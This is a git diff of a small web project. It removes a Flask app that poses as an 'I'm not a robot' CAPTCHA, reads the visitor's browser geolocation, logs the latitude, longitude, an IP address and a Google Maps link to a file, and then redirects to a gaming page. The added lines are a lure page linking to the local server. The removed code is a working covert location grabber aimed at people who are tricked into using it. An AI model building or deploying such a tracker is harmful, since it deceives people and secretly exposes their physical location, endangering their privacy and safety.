@@ -1,99 +1,14 @@
-from flask import Flask, request, render_template_string, redirect
-from datetime import datetime
-import requests
-
-app = Flask(__name__)
-
-# Template HTML sebagai string
-html_template = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>I'm not a robot</title>
-    <script>
-        function validateForm() {
-            var checkBox = document.getElementById("not_a_robot");
-            if (!checkBox.checked) {
-                alert("Please check the 'I'm not a robot' checkbox.");
-                return false;
-            }
-            return true;
-        }
-
-        function submitForm() {
-            if (validateForm()) {
-                navigator.geolocation.getCurrentPosition(success, error);
-            }
-        }
-
-        function success(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            var form = document.getElementById("location_form");
-            form.latitude.value = latitude;
-            form.longitude.value = longitude;
-            form.submit();
-        }
-
-        function error() {
-            alert("Unable to retrieve your location");
-        }
-
-        window.onload = function() {
-            document.getElementById("location_form").onsubmit = function(e) {
-                e.preventDefault();
-                submitForm();
-            };
-        };
-    </script>
+    <title>Access Link</title>
 </head>
 <body>
-    <form id="location_form" action="/submit" method="post">
-        <label>
-            <input type="checkbox" id="not_a_robot" name="not_a_robot">
-            I'm not a robot
-        </label>
-        <input type="hidden" name="latitude" value="">
-        <input type="hidden" name="longitude" value="">
-        <br>
-        <button type="submit">Submit</button>
-    </form>
+    <h1>Access the Link to Fivegaming</h1>
+    <p>Click the link below to access the page:</p>
+    <a href="http://127.0.0.1:5000
+    " target="_blank">Go to Link</a>
 </body>
 </html>
-"""
-
-@app.route('/')
-def index():
-    return render_template_string(html_template)
-
-@app.route('/submit', methods=['POST'])
-def submit():
-    if 'not_a_robot' not in request.form:
-        return "Checkbox not checked!"
-
-    latitude = request.form.get('latitude', 'Unknown')
-    longitude = request.form.get('longitude', 'Unknown')
-    
-    try:
-        # Get public IP using ipify
-        user_ip = requests.get('https://api.ipify.org').text
-    except requests.RequestException:
-        user_ip = 'Unknown'
-
-    try:
-        # Create Google Maps link
-        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
-    except Exception as e:
-        google_maps_link = 'Unknown'
-
-    # Log IP, latitude, longitude, and Google Maps link to admin_log.txt
-    with open("admin_log.txt", "a") as log_file:
-        log_file.write(f"Time: {datetime.now()}, IP: {user_ip}, Latitude: {latitude}, Longitude: {longitude}, Google Maps: {google_maps_link}\n")
-
-    # Redirect to the provided URL
-    return redirect("https://fivegaming24.github.io/open.html")
-
-if __name__ == '__main__':
-    app.run(debug=True)
